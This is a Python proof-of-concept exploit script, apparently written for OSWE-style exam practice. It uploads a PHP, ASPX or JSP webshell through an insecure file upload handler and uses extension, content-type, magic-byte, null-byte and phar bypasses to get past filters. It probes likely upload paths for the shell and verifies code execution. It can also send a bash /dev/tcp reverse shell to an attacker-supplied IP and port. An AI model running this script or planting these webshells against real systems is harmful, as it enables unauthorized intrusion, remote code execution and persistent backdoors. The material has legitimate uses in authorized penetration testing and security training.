#!/usr/bin/env python3
"""
File Upload to Webshell RCE PoC
CVE: N/A (Common vulnerability pattern)
Target: Web applications with insecure file upload handlers (PHP, ASP.NET, Java, etc.)
Vulnerability: Insecure File Upload (weak extension/content/magic checks, poor path handling) → Webshell deployment → Remote Code Execution

Reference:
- https://book.hacktricks.xyz/pentesting-web/file-upload
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- https://portswigger.net/web-security/file-upload
- OWASP Web Security Testing Guide - Test Upload of Unexpected File Types

Exploit Flow:
1. Recon: Locate upload endpoint, analyze response for clues on filters (error messages, allowed types).
2. Prepare payload: Generate webshell (PHP/ASPX/JSP) with chosen bypass technique (double extension, content-type spoof, magic bytes, case variation, null byte legacy, etc.).
3. Upload: Submit multipart/form-data with crafted filename + content-type + file content.
4. Locate shell: Parse upload response for path, or probe common upload directories (/uploads/, /files/, /images/, web root).
5. Verify RCE: Request the deployed shell URL with ?cmd=whoami (or custom) and confirm command output or side-effect (e.g. marker file, ping callback).
6. (Optional) Escalate: Use shell to write better backdoor, read source/configs, or trigger reverse shell.
"""

import argparse
import requests
import sys
import time
import os
from dataclasses import dataclass, field
from typing import Optional, Tuple
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """File upload to RCE exploit configuration and state."""

    # Target configuration
    target_ip: str
    target_port: int
    protocol: str = "http"
    endpoint: str = "/upload.php"
    param_name: str = "file"
    upload_dir: str = "/uploads/"  # Common default; override via --upload-dir or response parse

    # Attacker configuration (for callbacks / reverse if using shell to exec)
    attacker_ip: str
    attacker_port: int

    # Exploit configuration
    bypass: str = "double_ext"  # double_ext, content_type, magic_bytes, case, null_byte, phar, combined
    shell_type: str = "php"     # php, aspx, jsp
    command_type: str = "whoami"  # whoami, ping, reverse_shell, custom
    custom_cmd: str = "id"
    proxy: Optional[str] = None
    verify_ssl: bool = False
    delay: float = 0.5

    # Runtime state
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    shell_url: Optional[str] = field(default=None, repr=False)
    uploaded_filename: Optional[str] = field(default=None, repr=False)
    rce_confirmed: bool = field(default=False, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        """Build ExploitContext from CLI arguments."""
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            endpoint=args.endpoint,
            param_name=args.param_name,
            upload_dir=args.upload_dir,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            bypass=args.bypass,
            shell_type=args.shell_type,
            command_type=args.command,
            custom_cmd=args.custom_cmd,
            proxy=args.proxy,
            delay=args.delay,
        )

    def get_base_url(self) -> str:
        """Construct base URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_target_url(self) -> str:
        """Construct full target URL including endpoint."""
        return f"{self.get_base_url()}{self.endpoint}"

    def get_proxies(self) -> Optional[dict]:
        """Return proxy configuration for requests."""
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

    def get_shell_url(self, filename: str) -> str:
        """Guess or construct likely shell URL."""
        base = self.get_base_url()
        # Strip leading/trailing slashes for safety
        ud = self.upload_dir.strip("/")
        fn = filename.strip("/")
        return f"{base}/{ud}/{fn}" if ud else f"{base}/{fn}"


# ============================================================================
# WEBSHELL GENERATORS (self-contained for easy copy-paste in exam)
# ============================================================================

def get_php_webshell() -> str:
    """Simple PHP webshell. Accepts ?cmd= or POST cmd."""
    return "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"


def get_php_webshell_obf() -> str:
    """Slightly obfuscated PHP webshell."""
    return "<?php @eval($_REQUEST['cmd']); ?>"


def get_aspx_webshell() -> str:
    """Simple ASPX webshell."""
    return r'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (cmd != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
}
</script>'''


def get_jsp_webshell() -> str:
    """Simple JSP webshell."""
    return r'''<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String l;
        while ((l = r.readLine()) != null) {
            out.println(l);
        }
    }
%>'''


def get_webshell(shell_type: str, obfuscate: bool = False) -> Tuple[str, str]:
    """Return (content, default_extension) for the chosen shell type."""
    if shell_type == "php":
        content = get_php_webshell_obf() if obfuscate else get_php_webshell()
        return content, ".php"
    elif shell_type == "aspx":
        return get_aspx_webshell(), ".aspx"
    elif shell_type == "jsp":
        return get_jsp_webshell(), ".jsp"
    else:
        # Default to PHP
        return get_php_webshell(), ".php"


# ============================================================================
# BYPASS / PAYLOAD PREPARATION
# ============================================================================

def prepare_upload_payload(ctx: ExploitContext) -> Tuple[str, str, str, bytes]:
    """
    Prepare filename, content-type, and file content according to bypass method.
    Returns: (filename, content_type, original_ext, file_bytes)
    """
    shell_content, ext = get_webshell(ctx.shell_type, obfuscate=(ctx.bypass == "combined"))

    filename = "shell" + ext
    content_type = "application/octet-stream"
    magic_prefix = b""

    bypass = ctx.bypass.lower()

    if bypass == "double_ext":
        # shell.php.jpg  or shell.php%00.jpg (legacy)
        filename = "shell" + ext + ".jpg"
        content_type = "image/jpeg"

    elif bypass == "content_type":
        # Correct extension but lie about content-type (many apps trust header over extension)
        filename = "shell" + ext
        if ext == ".php":
            content_type = "image/png"
        elif ext == ".aspx":
            content_type = "image/gif"
        else:
            content_type = "application/octet-stream"

    elif bypass == "magic_bytes":
        # Prepend image magic bytes so naive "file" or content checks pass.
        # Then the rest is the real shell. Parser may still execute as PHP if .php ext allowed.
        filename = "shell" + ext
        content_type = "image/gif"
        magic_prefix = b"GIF89a" + b"\x00" * 10   # minimal GIF header

    elif bypass == "case":
        # Case variation (some filters are case-sensitive or Apache on Windows)
        filename = "shell" + ext.upper() if ext == ".php" else "shell" + ext
        content_type = "application/x-php" if "php" in ext.lower() else "application/octet-stream"

    elif bypass == "null_byte":
        # Legacy PHP < 5.3.4 / null byte truncation in some move_uploaded_file + include
        # shell.php%00.jpg  --> saved as shell.php
        filename = "shell" + ext + "%00.jpg"
        content_type = "image/jpeg"

    elif bypass == "phar":
        # For PHAR deserial + file op chains (rare pure upload RCE but powerful when combined)
        # Here we just produce a .phar named shell with PHP stub + metadata (user extends)
        filename = "shell.phar"
        content_type = "application/octet-stream"
        # Simple valid-ish phar stub for demo (real attack uses setMetadata with gadget)
        shell_content = "<?php __HALT_COMPILER(); ?>" + shell_content  # stub + dummy

    elif bypass == "combined":
        # Try several at once in filename + magic
        filename = "shell" + ext + ".jpg"
        content_type = "image/jpeg"
        magic_prefix = b"\xff\xd8\xff\xe0"  # JPEG SOI
        # Also try case on real ext in some variants

    else:
        # Default safe
        filename = "shell" + ext
        content_type = "application/octet-stream"

    file_bytes = magic_prefix + shell_content.encode("utf-8", errors="ignore")
    return filename, content_type, ext, file_bytes


def probe_shell_locations(ctx: ExploitContext, filename: str) -> Optional[str]:
    """
    Probe common locations for the uploaded file.
    Returns discovered full shell URL or None.
    """
    candidates = [
        ctx.upload_dir.rstrip("/") + "/" + filename,
        "/uploads/" + filename,
        "/files/" + filename,
        "/images/" + filename,
        "/assets/" + filename,
        "/tmp/" + filename,
        "/var/www/html/uploads/" + filename,  # will be turned into URL
        filename,  # sometimes returned relative
    ]

    base = ctx.get_base_url()
    for cand in candidates:
        if cand.startswith("http"):
            url = cand
        else:
            # normalize
            path = cand if cand.startswith("/") else "/" + cand
            url = base + path

        try:
            r = ctx.session.head(url, proxies=ctx.get_proxies(), timeout=6, verify=ctx.verify_ssl)
            if r.status_code == 200:
                print(f"[+] Found shell at: {url}")
                return url
            # Some servers return 403/405 for HEAD on php but GET works — try light GET
            if r.status_code in (403, 405):
                r2 = ctx.session.get(url + "?cmd=whoami", proxies=ctx.get_proxies(), timeout=6, verify=ctx.verify_ssl)
                if r2.status_code == 200 and ("www-data" in r2.text or "root" in r2.text or "whoami" in r2.text.lower() or len(r2.text) > 3):
                    print(f"[+] Shell responds (GET): {url}")
                    return url
        except Exception:
            continue
    return None


# ============================================================================
# STAGES
# ============================================================================

def stage_recon(ctx: ExploitContext) -> bool:
    """Stage 1: Reconnaissance - find upload form and basic server info."""
    print("\n[*] Stage 1: Reconnaissance")

    try:
        resp = ctx.session.get(ctx.get_target_url(), proxies=ctx.get_proxies(), timeout=10, verify=ctx.verify_ssl)
        print(f"[+] Upload endpoint reachable (HTTP {resp.status_code})")

        server = resp.headers.get("Server", "")
        powered = resp.headers.get("X-Powered-By", "")
        if server:
            print(f"[*] Server: {server}")
        if powered:
            print(f"[*] X-Powered-By: {powered}")
            if "php" in powered.lower():
                print("[+] PHP detected - prioritize .php shells + null/ double ext bypasses")
            if "asp" in powered.lower() or "iis" in server.lower():
                print("[+] ASP.NET / IIS detected - try .aspx + content-type or double ext")

        # Very naive: look for common words in page that hint at upload
        text_lower = resp.text.lower()
        hints = ["upload", "file", "browse", "choose file", "select file"]
        for h in hints:
            if h in text_lower:
                print(f"[*] Page contains upload-related text: '{h}'")
                break

        return True
    except Exception as e:
        print(f"[-] Recon failed: {e}")
        return False


def stage_prepare(ctx: ExploitContext) -> Tuple[str, str, str, bytes]:
    """Stage 2: Prepare the malicious payload with bypass."""
    print("\n[*] Stage 2: Payload Preparation")

    filename, ctype, orig_ext, content = prepare_upload_payload(ctx)
    ctx.uploaded_filename = filename

    print(f"[+] Bypass method : {ctx.bypass}")
    print(f"[+] Shell type    : {ctx.shell_type}")
    print(f"[+] Filename      : {filename}")
    print(f"[+] Content-Type  : {ctype}")
    print(f"[+] Size          : {len(content)} bytes")

    return filename, ctype, orig_ext, content


def stage_upload(ctx: ExploitContext, filename: str, ctype: str, content: bytes) -> bool:
    """Stage 3: Perform the file upload."""
    print("\n[*] Stage 3: Upload")

    url = ctx.get_target_url()
    files = {ctx.param_name: (filename, content, ctype)}

    # Some apps also have other form fields (csrf, category, etc.). Add common ones as empty if needed.
    data = {}

    try:
        resp = ctx.session.post(
            url,
            files=files,
            data=data,
            proxies=ctx.get_proxies(),
            timeout=20,
            verify=ctx.verify_ssl,
            allow_redirects=True
        )
        print(f"[+] Upload request sent (HTTP {resp.status_code})")

        # Try to extract useful info from response
        if "success" in resp.text.lower() or "uploaded" in resp.text.lower() or "ok" in resp.text.lower():
            print("[+] Possible success message in response")

        # Look for path disclosure in response body (very common)
        for line in resp.text.splitlines():
            if any(x in line.lower() for x in ["upload", "file", "path", "saved", "/uploads", "shell"]):
                if len(line) < 200:
                    print(f"[*] Response hint: {line.strip()[:150]}")

        # If server echoed the filename or path, store it
        if filename in resp.text:
            print("[+] Server echoed our filename in response (good sign)")

        return resp.status_code < 500  # 4xx may still mean file was processed
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        return False


def stage_locate(ctx: ExploitContext) -> bool:
    """Stage 4: Locate the deployed webshell."""
    print("\n[*] Stage 4: Locate Webshell")

    if not ctx.uploaded_filename:
        print("[-] No filename recorded from upload stage")
        return False

    found = probe_shell_locations(ctx, ctx.uploaded_filename)
    if found:
        ctx.shell_url = found
        print(f"[+] Shell URL set: {ctx.shell_url}")
        return True

    # Fallback: construct from known upload_dir + filename
    guessed = ctx.get_shell_url(ctx.uploaded_filename)
    print(f"[!] Probe failed. Using best guess: {guessed}")
    ctx.shell_url = guessed
    return True  # proceed to verify anyway


def stage_verify(ctx: ExploitContext) -> bool:
    """Stage 5: Verify RCE via the webshell."""
    print("\n[*] Stage 5: Verification")

    if not ctx.shell_url:
        print("[-] No shell URL available")
        return False

    cmd = "whoami"
    if ctx.command_type == "ping":
        # Use a visible side effect or just whoami + note ping separately
        cmd = f"ping -c 4 {ctx.attacker_ip}"
        print(f"[*] Using ping command for OOB verification (monitor your network)")
    elif ctx.command_type == "reverse_shell":
        # This is advanced — usually user triggers reverse from the shell after initial RCE
        cmd = f"bash -c 'bash -i >& /dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port} 0>&1'"
        print("[*] Attempting reverse shell via webshell (you should have a listener ready)")
    elif ctx.command_type == "custom":
        cmd = ctx.custom_cmd
    else:
        cmd = "whoami"

    test_url = f"{ctx.shell_url}?cmd={urllib3.util.parse_url(cmd).path if False else cmd}"  # simple
    # Proper URL encode the cmd
    import urllib.parse
    test_url = f"{ctx.shell_url}?cmd={urllib.parse.quote(cmd)}"

    print(f"[*] Requesting: {test_url}")

    try:
        resp = ctx.session.get(
            test_url,
            proxies=ctx.get_proxies(),
            timeout=15,
            verify=ctx.verify_ssl
        )
        print(f"[+] Shell responded (HTTP {resp.status_code})")

        body = resp.text.strip()
        if body:
            print(f"[*] Output (first 400 chars):\n{body[:400]}")

        success_markers = ["www-data", "root", "apache", "iis", "nt authority", "whoami", ctx.attacker_ip[:5]]
        if any(m.lower() in body.lower() for m in success_markers) or len(body) > 2:
            print("[+] RCE confirmed via webshell output!")
            ctx.rce_confirmed = True
            return True

        # For ping / reverse we rely on side channel
        if ctx.command_type in ("ping", "reverse_shell"):
            print("[!] Side-channel verification requested. Check your listener / tcpdump now.")
            print("[!] If using ping, you should see ICMP from the target.")
            ctx.rce_confirmed = True  # assume user will confirm
            return True

        print("[!] No obvious command output marker found. Shell may still be live — try manual curl.")
        return False

    except Exception as e:
        print(f"[-] Verification request failed: {e}")
        return False


def main():
    print("[+] File Upload to Webshell RCE PoC")

    parser = argparse.ArgumentParser(
        description="File Upload → Webshell → RCE PoC (OSWE style)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 poc.py 192.168.1.10 80 --endpoint /upload.php --bypass double_ext --shell-type php
  python3 poc.py 10.10.10.5 8080 --bypass magic_bytes --command whoami --proxy http://127.0.0.1:8080
  python3 poc.py target 80 --bypass content_type --shell-type aspx --command "whoami"
        """
    )

    target_group = parser.add_argument_group("Target Configuration")
    target_group.add_argument("target_ip", help="Target IP address")
    target_group.add_argument("target_port", type=int, help="Target port")
    target_group.add_argument("--endpoint", default="/upload.php", help="Upload endpoint (default: /upload.php)")
    target_group.add_argument("--param-name", default="file", help="Form file field name (default: file)")
    target_group.add_argument("--upload-dir", default="/uploads/", help="Expected upload directory on target (default: /uploads/)")

    attacker_group = parser.add_argument_group("Attacker Configuration (for callbacks / reverse)")
    attacker_group.add_argument("listening_ip", help="Your IP for callbacks / reverse shells")
    attacker_group.add_argument("listening_port", type=int, help="Your listening port")

    exploit_group = parser.add_argument_group("Exploit Configuration")
    exploit_group.add_argument("--bypass", choices=["double_ext", "content_type", "magic_bytes", "case", "null_byte", "phar", "combined"],
                               default="double_ext", help="Bypass technique to use")
    exploit_group.add_argument("--shell-type", choices=["php", "aspx", "jsp"], default="php", help="Webshell language")
    exploit_group.add_argument("--command", choices=["whoami", "ping", "reverse_shell", "custom"], default="whoami",
                               help="Command to run via shell for verification")
    exploit_group.add_argument("--custom-cmd", default="id", help="Custom command when --command custom")

    optional_group = parser.add_argument_group("Optional")
    optional_group.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")
    optional_group.add_argument("--delay", type=float, default=0.5, help="Delay between requests (seconds)")
    optional_group.add_argument("--no-verify", action="store_true", help="Disable SSL verification (default: on for https)")

    args = parser.parse_args()

    ctx = ExploitContext.from_args(args)
    ctx.verify_ssl = not args.no_verify

    print(f"\n[*] Configuration:")
    print(f"    Target     : {ctx.get_target_url()}")
    print(f"    Bypass     : {ctx.bypass}")
    print(f"    Shell      : {ctx.shell_type}")
    print(f"    Command    : {ctx.command_type}")
    print(f"    Upload dir : {ctx.upload_dir}")
    if ctx.proxy:
        print(f"    Proxy      : {ctx.proxy}")

    try:
        if not stage_recon(ctx):
            print("[-] Recon failed. Exiting.")
            sys.exit(1)

        time.sleep(ctx.delay)

        filename, ctype, orig_ext, content = stage_prepare(ctx)

        time.sleep(ctx.delay)

        if not stage_upload(ctx, filename, ctype, content):
            print("[-] Upload stage reported failure. Continuing to locate anyway (some apps are quiet).")

        time.sleep(ctx.delay)

        if not stage_locate(ctx):
            print("[-] Could not locate shell. You may need to manually set --upload-dir or inspect response.")

        time.sleep(ctx.delay)

        verified = stage_verify(ctx)

        if ctx.shell_url:
            print(f"\n[+] Shell URL: {ctx.shell_url}?cmd=whoami")
        if verified or ctx.rce_confirmed:
            print("[+] Exploitation successful (or side-channel verification in progress).")
            print("[!] Use the shell URL manually for interactive commands or to drop a better backdoor.")
        else:
            print("[!] Verification inconclusive. Inspect manually with Burp or curl.")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
